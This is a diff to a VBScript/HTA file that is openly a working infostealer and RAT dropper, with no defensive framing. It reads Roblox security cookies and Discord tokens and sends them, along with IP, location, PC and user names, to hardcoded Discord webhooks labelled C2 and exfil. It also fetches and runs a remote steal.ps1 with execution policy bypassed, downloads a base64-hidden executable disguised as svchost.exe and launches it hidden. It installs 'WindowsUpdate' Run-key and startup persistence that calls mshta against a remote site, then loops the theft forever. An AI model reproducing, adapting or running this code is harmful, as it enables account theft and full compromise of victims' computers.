@@ -10,43 +10,55 @@ Dim sh, fso, WH, RE_WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' --- WEBHOOKS ---
-WH = "https://discord.com/api/webhooks/1570467153411580079/6o8a06-f2kyoDF8zd_0ANhXglmRB9e4ZmIBik7WNn_TXnFRyxqHY2-dNrR2lyNyddiWJ"
-RE_WH = "https://discord.com/api/webhooks/1570467017717317683/8cMheG5I8Kloz5TDrQViLMFgOdOn09xK-zY58223bRkUgXnQcB-kMEr2rZKFEI5P4Z4I"
+' C2 WEBHOOK (Commands / Responses)
+WH = "https://discord.com/api/webhooks/1572026403560357978/n4qVnwrF6-OKw6vRfm73KZNXc-8X3IVSkOgQcfRb35d92LOEujl6OMvBy3GpPWrsXdQN"
+' EXFIL WEBHOOK (Logs / Drops)
+RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py18HaoCznPd3rfi411OUUewgpFL9Sfx7JGM7qYRtNtXU3vkHh5r"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- Initial Grab ---
-Call GrabTokens
-Call IP
-Call GrabRoblox
-Call Persistence
-Call DropRAT(WH, True)
+' --- 1. INITIAL GRABS ---
+Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
+Call IP(WH)
+Call GrabTokens(WH)
 
-' --- Re-run grab chain 4x (every 5 min) ---
+' --- 2. PERSISTENCE ---
+Call Persistence
+
+' --- 3. DROP RAT 1 (The C2 Bot Agent) ---
+Call DropRAT(WH, True)
+Call DropRAT(RE_WH, False)
+
+' --- 4. INTERACTIVE LOOP (Re Grab N, forever, re-drops RAT every cycle) ---
 Dim runCount
-For runCount = 1 To 4
-    Call PostEmbedTo(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003, RE_WH)
-    Call GrabTokens
-    Call IP
-    Call GrabRoblox
+runCount = 0
+Do
+    runCount = runCount + 1
+    Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, RE_WH)
+    
+    Call GrabTokens(RE_WH)
+    Call IP(RE_WH)
+    Call PostCookieOnly(RE_WH)
+    
+    ' Re-drop the RAT every cycle so a failed launch is retried
     Call DropRAT(RE_WH, True)
-    If runCount < 4 Then Call SleepMinutes(5)
-Next
+    
+    Call SleepSeconds(60)
+Loop
 
 window.close()
 
 ' --- RAT DROP ---
-Sub DropRAT(targetWH, sendEmbed)
-    ' base64 of: https://cdn.discordapp.com/attachments/1557266192971071579/1572374295328595989/client_1.exe?ex=6afe232d&is=6afcd1ad&hm=c38c39196b3e3dcea4c5b2b717a00299b74bf7c6eee187fa27238f7cd91887ee&
+Sub DropRAT(targetWH, sendRocket)
+    ' Base64 of: https://cdn.discordapp.com/attachments/1557266192971071579/1572374295328595989/client_1.exe?ex=6afe232d&is=6afcd1ad&hm=c38c39196b3e3dcea4c5b2b717a00299b74bf7c6eee187fa27238f7cd91887ee&
     Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcyMzc0Mjk1MzI4NTk1OTg5L2NsaWVudF8xLmV4ZT9leD02YWZlMjMyZCZpcz02YWZjZDFhZCZobT1jMzhjMzkxOTZiM2UzZGNlYTRjNWIyYjcxN2EwMDI5OWI3NGJmN2M2ZWVlMTg3ZmEyNzIzOGY3Y2Q5MTg4N2VlJg=="
     Dim dl : dl = DecodeB64(b64Url)
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
     Dim op : op = tPath & "\svchost.exe"
     
-    If sendEmbed Then
-        Call PostEmbedTo(":rocket: RAT Download Initiated", "Downloading and launching RAT", 3447003, targetWH)
+    If sendRocket Then
+        Call PostEmbedTo(":rocket: RAT Download Initiated", "Downloading and launching RAT", 10181046, targetWH)
     End If
 
     If fso.FileExists(op) Then fso.DeleteFile op, True
@@ -56,32 +68,84 @@ Sub DropRAT(targetWH, sendEmbed)
 
     If fso.FileExists(op) Then
         If fso.GetFile(op).Size > 100000 Then
-            If sendEmbed Then Call PostEmbedTo(":white_check_mark: Rat Launched", "Rat Launched", 3447003, targetWH)
+            If sendRocket Then Call PostEmbedTo(":white_check_mark: Rat Launched", "Rat Launched", 10181046, targetWH)
             Call RunCmd("""" & op & """")
         End If
     End If
 End Sub
 
-' --- IP Function ---
-Sub IP()
-    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xh.SetOption 2, 13056
-    xh.Open "GET", "https://api.ipify.org/", False
-    xh.Send
-    If xh.Status <> 200 Then Exit Sub
-    Dim ip : ip = xh.responseText
-    If Len(ip) < 7 Then Exit Sub
-    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
-    xh.Send
-    If xh.Status <> 200 Then Exit Sub
-    Dim ll : ll = Split(xh.responseText, vbLf)
-    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
-    Call PostEmbed(":dart: Target", info, 3447003)
-    Set xh = Nothing
+' --- DISCORD BOT AGENT ARCHITECTURE ---
+' The dropped RAT (secondary payload) should be a Python/PowerShell/C++ agent that:
+' 1. Connects to Discord Gateway via Bot Token.
+' 2. Listens to a specific channel for commands (!screenshot, !webcam, !shell <cmd>, etc.).
+' 3. Validates the command matches the target PC name.
+' 4. Executes the action and posts the result (image, text, file) back to the webhook.
+'
+' You need to write the agent code (Python w/ discord.py is easiest) and host the .exe/script.
+
+' --- SIMPLE AVATAR UI + COOKIE ---
+Sub SendAvatarUI(targetWH)
+    Dim cookie : cookie = GetRobloxCookie()
+    Dim av : av = "https://tr.rbxcdn.com/f4e7f1f6c7b2e0f2e6c2c8e2b4f4e2b4/420/420/AvatarHeadshot/Png"
+
+    If Len(cookie) > 50 Then
+        On Error Resume Next
+        Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+        xh.SetOption 2, 13056
+        xh.Open "GET", "https://users.roblox.com/v1/users/authenticated", False
+        xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
+        xh.SetRequestHeader "User-Agent", "Roblox/WinInet"
+        xh.Send
+        
+        If xh.Status = 200 Then
+            Dim uid : uid = "1"
+            Dim m1 : Set m1 = CreateObject("VBScript.RegExp")
+            m1.Pattern = """id"":(\d+)"
+            Dim m2 : Set m2 = m1.Execute(xh.responseText)
+            If m2.Count > 0 Then uid = m2(0).SubMatches(0)
+            
+            Dim axh : Set axh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+            axh.SetOption 2, 13056
+            axh.Open "GET", "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" & uid & "&size=420x420&format=Png", False
+            axh.Send
+            If axh.Status = 200 Then
+                Dim am1 : Set am1 = CreateObject("VBScript.RegExp")
+                am1.Pattern = """imageUrl"":""([^""]+)"""
+                Dim am2 : Set am2 = am1.Execute(axh.responseText)
+                If am2.Count > 0 Then av = am2(0).SubMatches(0)
+            End If
+        End If
+        On Error Goto 0
+    End If
+
+    Dim DQ : DQ = Chr(34)
+    Dim j : j = "{" & DQ & "content" & DQ & ":" & DQ & "@everyone Target Hit" & DQ & "," & DQ & "embeds" & DQ & ":[{" & _
+                DQ & "title" & DQ & ":" & DQ & "Roblox Avatar" & DQ & "," & _
+                DQ & "color" & DQ & ":10181046," & _
+                DQ & "image" & DQ & ":{" & DQ & "url" & DQ & ":" & DQ & av & DQ & "}}]}"
+
+    Dim h : Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", targetWH, False
+    h.SetRequestHeader "Content-Type", "application/json"
+    h.Send j
+    Set h = Nothing
+
+    If Len(cookie) > 0 Then
+        Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
+    End If
 End Sub
 
-' --- GrabRoblox Function ---
-Sub GrabRoblox()
+' --- PostCookieOnly ---
+Sub PostCookieOnly(targetWH)
+    Dim cookie : cookie = GetRobloxCookie()
+    If Len(cookie) = 0 Then Exit Sub
+    Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
+End Sub
+
+' --- GetRobloxCookie ---
+Function GetRobloxCookie()
+    GetRobloxCookie = ""
     Dim paths(4)
     paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
     paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
@@ -106,9 +170,10 @@ Sub GrabRoblox()
             Set folder = Nothing
         End If
     End If
-    If Len(fp) = 0 Then Exit Sub
+    If Len(fp) = 0 Then Exit Function
+    
     raw = ReadFile(fp)
-    If Len(raw) < 50 Then Exit Sub
+    If Len(raw) < 50 Then Exit Function
 
     Dim cookie: cookie = ""
     If InStr(raw, "_|WARNING") > 0 Then cookie = raw
@@ -138,101 +203,8 @@ Sub GrabRoblox()
     Dim warn: warn = InStr(cookie, "_|WARNING")
     If warn > 1 Then cookie = Mid(cookie, warn)
 
-    PostEmbed "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280
-    PostFile "cookie.txt", cookie
-End Sub
-
-' --- Sleep Functions ---
-Sub SleepSeconds(s)
-    Dim t0, t1, t2, elapsed
-    t0 = Timer()
-    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
-    sh.Run cmd, 0, True
-    elapsed = Timer() - t0
-    If elapsed < 0 Then elapsed = elapsed + 86400
-    If elapsed < s Then
-        t1 = Timer()
-        Do
-            t2 = Timer()
-            If t2 < t1 Then t2 = t2 + 86400
-            If (t2 - t1) >= (s - elapsed) Then Exit Do
-        Loop
-    End If
-End Sub
-
-Sub SleepMinutes(m)
-    Call SleepSeconds(m * 60)
-End Sub
-
-' --- Persistence ---
-Sub Persistence()
-    Dim payload : payload = "mshta https://dicerigs.app"
-    On Error Resume Next
-    
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
-    
-    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
-    Dim sf : Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
-    sf.Close
-    
-    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 65280)
-End Sub
-
-' --- GrabTokens ---
-Sub GrabTokens()
-    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/iveshahaha/bb5e511a627ff1ce80ccc4839153f901/raw/steal.ps1", False
-    xh.Send
-    If xh.Status <> 200 Then Exit Sub
-    Dim pc: pc = xh.responseText
-    If Len(pc) < 100 Then Exit Sub
-    Set xh = Nothing
-    
-    Dim psf: psf = TmpFile("steal.ps1")
-    WriteFile psf, pc
-    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
-    fso.DeleteFile psf, True
-    
-    Dim tf: tf = TmpFile("steal_result.txt")
-    If Not fso.FileExists(tf) Then Exit Sub
-    Dim raw: raw = ReadFile(tf)
-    
-    If Len(raw) > 10 Then
-        Dim lines: lines = Split(raw, vbCrLf)
-        Dim l
-        For Each l In lines
-            If Len(l) > 10 Then
-                If Left(l, 8) = "DISCORD|" Then
-                    Dim p: p = Split(Mid(l, 9), "|")
-                    If UBound(p) >= 4 Then
-                        Dim info: info = "**User:** " & p(0) & vbCrLf
-                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
-                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
-                        If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
-                        info = info & "**Token:** " & p(4)
-                        Call PostEmbedTo(":gift: Discord Token", info, 5793266, RE_WH)
-                    End If
-                End If
-                If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
-                    Call PostEmbed(":cookie: Roblox Cookie", Mid(l, 8), 65280)
-                End If
-            End If
-        Next
-    End If
-End Sub
-
-' --- RunCmd (hidden launch) ---
-Sub RunCmd(cmd)
-    Dim w,p,i,s
-    Set w = GetObject("winmgmts:\\.\root\cimv2")
-    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
-    s.ShowWindow = 0
-    Set p = w.Get("Win32_Process")
-    p.Create cmd,,s,i
-End Sub
+    GetRobloxCookie = cookie
+End Function
 
 ' --- Base64 Decoder ---
 Function DecodeB64(str)
@@ -257,17 +229,116 @@ Function Stream_BinaryToString(Binary)
     Stream.Close
 End Function
 
+' --- RunCmd ---
+Sub RunCmd(cmd)
+    Dim w,p,i,s
+    Set w = GetObject("winmgmts:\\.\root\cimv2")
+    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
+    s.ShowWindow = 0
+    Set p = w.Get("Win32_Process")
+    p.Create cmd,,s,i
+End Sub
+
+' --- IP Function ---
+Sub IP(targetWH)
+    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", "https://api.ipify.org/", False
+    xh.Send
+    If xh.Status <> 200 Then Exit Sub
+    Dim ip : ip = xh.responseText
+    If Len(ip) < 7 Then Exit Sub
+    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
+    xh.Send
+    If xh.Status <> 200 Then Exit Sub
+    Dim ll : ll = Split(xh.responseText, vbLf)
+    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
+    Call PostEmbedTo(":dart: Target", info, 10181046, targetWH)
+    Set xh = Nothing
+End Sub
+
+' --- Sleep Functions ---
+Sub SleepSeconds(s)
+    Dim t0, t1, t2, elapsed
+    t0 = Timer()
+    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
+    sh.Run cmd, 0, True
+    elapsed = Timer() - t0
+    If elapsed < 0 Then elapsed = elapsed + 86400
+    If elapsed < s Then
+        t1 = Timer()
+        Do
+            t2 = Timer()
+            If t2 < t1 Then t2 = t2 + 86400
+            If (t2 - t1) >= (s - elapsed) Then Exit Do
+        Loop
+    End If
+End Sub
+
+' --- Persistence ---
+Sub Persistence()
+    Dim payload : payload = "mshta https://dicerigx.app/"
+    On Error Resume Next
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
+    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
+    Dim sf : Set sf = fso.CreateTextFile(sp, True)
+    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
+    sf.Close
+    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 10181046)
+End Sub
+
+' --- GrabTokens ---
+Sub GrabTokens(targetWH)
+    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", "https://gist.githubusercontent.com/lozix94-afk/172084531c9168c0fe4b4cacc5bb0a45/raw/127a7a0f6723e9b88492fe4c7e5e533e140b1d06/steal.ps1", False
+    xh.Send
+    If xh.Status <> 200 Then Exit Sub
+    Dim pc: pc = xh.responseText
+    If Len(pc) < 100 Then Exit Sub
+    Set xh = Nothing
+    Dim psf: psf = TmpFile("steal.ps1")
+    WriteFile psf, pc
+    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
+    fso.DeleteFile psf, True
+    Dim tf: tf = TmpFile("steal_result.txt")
+    If Not fso.FileExists(tf) Then Exit Sub
+    Dim raw: raw = ReadFile(tf)
+    If Len(raw) > 10 Then
+        Dim lines: lines = Split(raw, vbCrLf)
+        Dim l
+        For Each l In lines
+            If Len(l) > 10 Then
+                If Left(l, 8) = "DISCORD|" Then
+                    Dim p: p = Split(Mid(l, 9), "|")
+                    If UBound(p) >= 4 Then
+                        Dim info: info = "**User:** " & p(0) & vbCrLf
+                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
+                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
+                        If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
+                        info = info & "**Token:** " & p(4)
+                        Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
+                    End If
+                End If
+                If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
+                    Call PostEmbedTo(":cookie: Roblox Cookie", Mid(l, 8), 10181046, targetWH)
+                End If
+            End If
+        Next
+    End If
+End Sub
+
 ' --- Utility Functions ---
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
 Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
 Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
 
-' --- PostEmbed (Default Webhook) ---
+' --- PostEmbed ---
 Sub PostEmbed(t, d, c)
     Call PostEmbedTo(t, d, c, WH)
 End Sub
 
-' --- PostEmbedTo (Custom Webhook) ---
 Sub PostEmbedTo(t, d, c, target_wh)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
@@ -276,19 +347,6 @@ Sub PostEmbedTo(t, d, c, target_wh)
     h.Open "POST", target_wh, False
     h.SetRequestHeader "Content-Type", "application/json"
     h.Send j
-    Set h = Nothing
-End Sub
-
-' --- PostFile ---
-Sub PostFile(fn, ct)
-    Dim DQ: DQ = Chr(34)
-    Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
-    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "POST", WH, False
-    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
-    h.Send bd
     Set h = Nothing
 End Sub
 
@@ -320,4 +378,4 @@ Function Ej(s)
     Ej = Replace(Ej, vbTab, Chr(92) & "t")
 End Function
 </script>
-</head><body></body></html>
+</body></html>
